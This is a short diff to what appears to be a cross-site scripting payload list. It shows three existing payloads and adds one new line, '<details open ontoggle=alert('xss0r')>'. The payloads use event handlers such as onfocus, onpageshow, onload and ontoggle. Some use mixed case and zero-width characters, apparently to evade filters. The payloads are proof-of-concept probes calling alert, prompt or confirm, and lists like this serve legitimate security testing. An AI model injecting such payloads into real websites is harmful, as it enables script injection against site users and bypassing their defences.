@@ -21,3 +21,4 @@
 "><body/onfocus​=(confirm)(document.domain)>
 "><Body/oNpagEshoW​=(prompt)(1)>
 "><svg only=1 onload=prompt(document.domain)>
+<details open ontoggle=alert('xss0r')>
